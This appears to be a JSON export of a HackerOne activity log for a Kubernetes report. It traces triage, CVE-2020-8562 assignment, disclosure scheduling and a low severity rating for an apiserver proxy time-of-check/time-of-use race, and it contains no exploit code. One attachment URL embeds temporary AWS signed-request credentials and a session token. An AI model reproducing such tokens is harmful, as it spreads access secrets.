      "created_at": "2020-06-26T23:22:25.139Z",
      "updated_at": "2020-06-26T23:22:25.139Z",
      "actor": {
        "username": "javierprovecho",
        "cleared": false,
        "verified": false,
        "url": "/javierprovecho",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/RfpdaCWFuwm8WXf4KZM8xFWW/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 9240665,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi,\n\nBecause the September security patch date has passed, I wonder what is the updated timeline for the resolution of this report.\n\nThanks,\nJavier.",
      "automated_response": false,
      "created_at": "2020-09-16T20:44:45.639Z",
      "updated_at": "2020-09-16T20:46:33.975Z",
      "actor": {
        "username": "javierprovecho",
        "cleared": false,
        "verified": false,
        "url": "/javierprovecho",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/RfpdaCWFuwm8WXf4KZM8xFWW/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 9327804,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "cc @mhausler ",
      "automated_response": false,
      "created_at": "2020-09-25T09:46:06.944Z",
      "updated_at": "2020-09-25T09:46:06.944Z",
      "actor": {
        "username": "javierprovecho",
        "cleared": false,
        "verified": false,
        "url": "/javierprovecho",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/RfpdaCWFuwm8WXf4KZM8xFWW/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 11519580,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "",
      "automated_response": false,
      "created_at": "2021-04-26T17:41:10.255Z",
      "updated_at": "2021-04-26T17:41:10.255Z",
      "actor": {
        "username": "mhausler",
        "cleared": false,
        "verified": false,
        "url": "/mhausler",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/611/880/c3006222ff073932b4376fc2cef2cbaf94a7afdd_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 11519644,
      "is_internal": false,
      "editable": false,
      "type": "Activities::CveIdAdded",
      "message": "",
      "automated_response": false,
      "created_at": "2021-04-26T17:46:10.112Z",
      "updated_at": "2021-04-26T17:46:10.112Z",
      "cve_ids": [
        "CVE-2020-8562"
      ],
      "actor": {
        "username": "mhausler",
        "cleared": false,
        "verified": false,
        "url": "/mhausler",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/611/880/c3006222ff073932b4376fc2cef2cbaf94a7afdd_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 11520468,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi Javier,\n\nThank you for your patience, and I apologize for the long gap on this one, and owe you an explanation. I've been trying to push for a fix before disclosure, but as Kubernetes is community-driven by volunteers from different companies with different priorities and timelines, there was not enough interest or action in resolving this issue with a code fix prior to disclosure.\n\nGiven the threat model and complexity of a fix, we're planning on making a distributor announcement about the issue this week and then publicly disclosing this for a fix in the open next week. \n\nHow would you like to be credited in the announcement?\n\nMicah\n\n\n",
      "automated_response": false,
      "created_at": "2021-04-26T18:55:00.706Z",
      "updated_at": "2021-04-26T18:55:00.706Z",
      "actor": {
        "username": "mhausler",
        "cleared": false,
        "verified": false,
        "url": "/mhausler",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/611/880/c3006222ff073932b4376fc2cef2cbaf94a7afdd_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 11537053,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "Closing report to request disclosure",
      "automated_response": false,
      "created_at": "2021-04-27T18:52:06.982Z",
      "updated_at": "2021-04-27T18:52:06.982Z",
      "actor": {
        "username": "mhausler",
        "cleared": false,
        "verified": false,
        "url": "/mhausler",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/611/880/c3006222ff073932b4376fc2cef2cbaf94a7afdd_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "javierprovecho",
        "url": "/javierprovecho"
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 11537204,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "Requesting disclosure for May 4th, 9:00am PT/ 16:00 UTC",
      "automated_response": false,
      "created_at": "2021-04-27T19:11:00.279Z",
      "updated_at": "2021-04-27T19:11:00.279Z",
      "first_to_agree": true,
      "actor": {
        "username": "mhausler",
        "cleared": false,
        "verified": false,
        "url": "/mhausler",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/611/880/c3006222ff073932b4376fc2cef2cbaf94a7afdd_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 11538144,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi Micah,\n\nThanks for the details. I understand the situation and I'm happy this vulnerability is going to be disclosed. :)\n\nI'd like to be credited as:\n\nJavier Provecho (Telefonica)\n\nI've a couple of questions:\n\n- Does this vulnerability needs a CVE ID request?\n- If yes, it is already requested or should I request one?\n\nThanks,\nJavier.\n\n{F1280808}",
      "automated_response": false,
      "created_at": "2021-04-27T20:43:23.246Z",
      "updated_at": "2021-04-27T20:43:23.246Z",
      "actor": {
        "username": "javierprovecho",
        "cleared": false,
        "verified": false,
        "url": "/javierprovecho",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/RfpdaCWFuwm8WXf4KZM8xFWW/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 1280808,
          "filename": "best_crop_e899944fbb3ca3ed52c6_mini_magick20200504-24929-1tswe7j.jpg",
          "type": "image/jpeg",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8ywligj4bcpviarl77wxjgb7ccsp?response-content-disposition=attachment%3B%20filename%3D%22best_crop_e899944fbb3ca3ed52c6_mini_magick20200504-24929-1tswe7j.jpg%22%3B%20filename%2A%3DUTF-8%27%27best_crop_e899944fbb3ca3ed52c6_mini_magick20200504-24929-1tswe7j.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRI2DKS33%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071242Z&X-Amz-Expires=3230&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIClqVjComm5eHHgl4hk6izxePckLv8jDeMc0T9b7T3O3AiADmJZnWuzG%2B70iNqDIQCs8vCBykwa2yXC74JTt7oggICqyBQgjEAMaDDAxMzYxOTI3NDg0OSIMymNPAONb%2FCmXBdVeKo8FJzded9JrQRalz027Fy9ORg8M6dHgBBXFzVDsXNDc1JhsKfZyKPDvBwtVth3yDUjFVges68qucKHRijQ6l7wR%2BSrXd5GDh5pLy2MTIGZe67Nnez9UpyMMkMJctkxp2GshCXqzgeHl6v5vSB7diJyZoACs1T7UBRfBPVqB2ExFrI2%2ByTsFYZc7jw70kHGnPahik3gX45Na5Kayh8HRMrZ3nvkWoQsOaDXxlIuviOeI5Nyk%2BqknsMl85LFsHGofSTOGYZXckaP1kkyR%2Fws8c%2FsDxEPpjbWADHNIoe1MFd9enDvdgnJNwHThsUBDzs2HZ0DaxfueMMQsmaKM7fUJBEcCBdyLJgLh9FwY2rWv0osDiBaDwoJBATYz0TqNSzbPLCHXCY4yvjrupR020hIrH7h6vaAO5AGy8BvQlbd4pDsg3fydvKz0cbgeICmouv0Z1B%2BNOmdg%2BiZsobA1R9WzJqDzDfOVTl5%2BplONkde1nrnLg%2FMBW9mk6pF4ZVrKen5uchggefwkdoDb8%2BQe0Ajvj8x8xFdUsC%2FFWEdzRTRjBETbScuWC84tinh7KwW8N2gJzaorc6xcHTdBLvgUtj96BY6lEvsNyjfHwLGgutWn8FvrDQIseWHlWXnVVIfP4p6hSWttAAC9HFoMzHIskKQ8OP21vUmVnZdmOmSLz1dG07Xymll1yNHsBo3AtM2WqzA%2BgnJvv6xCVMBGtXCr%2Fwgk0SMyytjAAt2Ayqtb%2FMcO4y9jne5RcXfe18ZM26LZ8Q%2FAr%2B7y5tFCIDsL%2Bv%2Fu41E9njnrOd4bPbjlDbGY6FQGcUeT8IjQ6%2FqK9rzqwByRyUW84v%2Fm6tpHTp9GZ3Z%2F8GxGiq1ytLMwnn4Nr8mHZoVXW95MFDDxhbmoBjqyAZJiId57NZFL44uwPAXChJjOVBJpFacYn6dA566GE9JXcWCJbWbLvQ1PLav0JA%2FFjK1C6zjLxpR6Zgm%2Bb1YVJ%2Fwvyz5iKzFpjrw5DUkBbq7AqgC1wANIYsCzKnybPgJV%2FdvDI8wXqZ5s4I4kfGwElgjNbNXwCPPz0GSv35NPkyyyGZTFfTgucOASY3bZjNx0yQISVMqLnWZVnzBkXcLX7FeL1pcuvp4XRZgpKzT%2BnTs6PiU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e81c9d5201d0d498dcda5840f917d8ae08a519d0ebd906b989728fa23fe7584a"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 11539004,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thank you for asking! This issue has been rated Low ([CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:N/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:N/A:N)) and assigned **CVE-2020-8562**.\n\nThe reason for the final low rating is several fold. First, this requires a high level of privileges, essentially cluster-admin. Third, the attack complexity is relatively high. Third, in Kubernetes, access to private networks doesn't necessarily represent a privilege escalation: etcd uses mTLS, and kube-apiserver doesn't enable an insecure port. Access to outside systems (such as cloud metadata) is speculative and implementation-specific.\n\nI've pre-created a GitHub issue on https://github.com/kubernetes/kubernetes/issues/101493 where I'll post details on Tuesday",
      "automated_response": false,
      "created_at": "2021-04-27T21:40:31.063Z",
      "updated_at": "2021-04-27T21:40:31.063Z",
      "actor": {
        "username": "mhausler",
        "cleared": false,
        "verified": false,
        "url": "/mhausler",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/611/880/c3006222ff073932b4376fc2cef2cbaf94a7afdd_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 11906997,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2021-05-27T19:11:03.914Z",
      "updated_at": "2021-05-27T19:11:03.914Z",
      "actor": {
        "url": "/kubernetes",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "Kubernetes"
        }
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "id": 21462,
      "category": "researcher",
      "content": "TL,DR: Time-of-check (apiserver proxy filter) Time-of-use (apiserver proxy request) Race Condition.",
      "user": {
        "id": 1078382,
        "username": "javierprovecho",
        "name": "Javier Provecho Fernandez",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2020-04-26T21:46:13.245Z",
        "url": "https://hackerone.com/javierprovecho",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/RfpdaCWFuwm8WXf4KZM8xFWW/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/RfpdaCWFuwm8WXf4KZM8xFWW/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/RfpdaCWFuwm8WXf4KZM8xFWW/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": [

      ]
    }
  ]
}